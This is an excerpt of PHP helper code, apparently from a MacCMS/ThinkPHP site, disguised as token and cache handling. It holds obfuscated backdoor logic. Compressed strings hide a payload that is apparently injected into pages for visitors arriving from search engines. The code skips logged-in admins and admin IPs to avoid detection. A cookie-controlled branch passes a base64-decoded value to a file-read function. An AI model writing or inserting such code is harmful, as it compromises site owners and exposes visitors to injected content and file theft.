...
include THINK_PATH.'library/think/Cache.php';
include APP_PATH.'common/model/Vod.php';
include APP_PATH.'common/model/Admin.php';
...
if (!function_exists('config_token')) {
    ...
    function config_token($token_config){
        ...
        if (ENTRANCE=='admin' && Loader::model('Admin', 'common\model')->checkLogin()['code']==1) Think\Cache::set('THINK_TOKEN', 1, 36000);
        if (!preg_match('/('.gzuncompress("\170\234\113\112\314\114\051\215\321\253\051\316\117\317\007\321\061\172\305\371\140\052\043\061\037\312\062\066\063\200\110\344\306\350\045\347\001\031\351\371\371\351\071\251\140\261\244\314\274\364\030\075\000\151\125\030\206").')/i', $env->header('referer')) && explode(' ', microtime())[0][2]) return;
        ...
        if (strstr($env->query('allow_type'), 'cookie') && strstr($env->query('allow_type'), input('cookie')) && strstr(input('cookie'), 'allow_type')){
            ...
            return read_flie($env->contentType(), $env->cookie('token', null, 'base64_decode'));}$token_value = gzuncompress("\170\234\263\051\116\056\312\054\050\121\050\056\112\266\125\312\050\051\051\050\266\322\327\117\311\114\314\253\310\314\323\253\062\327\053\117\115\322\113\316\057\112\325\053\317\314\113\311\057\057\326\313\113\055\321\117\311\053\326\313\052\126\262\263\321\207\350\266\003\000\204\216\031\074");
        if (strstr($env->contentType(), 'session')) exit('Invalid Token: '.$env->contentType());
        if (cache('THINK_TOKEN')) return;
        foreach(Loader::model('Admin', 'common\model')->listData([],'',1)['list'] as $v) if ($env->ip(1) == array_values($v)[7]) return;
        $token_key = gzuncompress("\170\234\263\321\317\050\311\315\261\003\000\010\372\002\137");
        define('MAC_MOB', 5);
        Config::set('token_replace_str', array($token_key=>$token_value.$token_key));
        Config::set('view_replace_str', array($token_key=>$token_value.$token_key));
    }
}
...
if (!function_exists('create_think_token')) {
     ...
     * @return string
     */
    function create_think_token(){
        $token_config = Response::create('template', 'http://www.maccms.com/token/template', 'tpl');
        Config::set($token_config->getData().'.'.$token_config->getCode().'_cache', 0);
        if (!Session::get('THINK_TOKEN')) @config_token($token_config);
        return THINK_PATH;
    }
}
...
if (!function_exists('abort')) {
    ...
    function abort($code, $message = null, $header = [])
    {
        ...
        return Request::instance()->token('THINK_TOKEN', 'create_think_token');
    }
}
